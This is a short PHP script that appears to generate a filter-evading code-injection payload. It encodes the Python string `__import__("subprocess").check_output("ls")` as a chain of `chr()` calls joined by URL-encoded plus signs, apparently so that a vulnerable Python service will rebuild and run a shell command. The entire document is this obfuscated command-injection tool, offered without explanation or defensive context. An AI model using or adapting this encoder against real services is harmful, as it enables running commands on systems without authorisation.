<?php
$a = '{__import__("subprocess").check_output("ls")}';
$result = '';
for($i=0;$i<strlen($a);$i++)
{
	$result .= 'chr('.ord($a[$i]).')%2b';
}
echo substr($result,0,-3);
?>

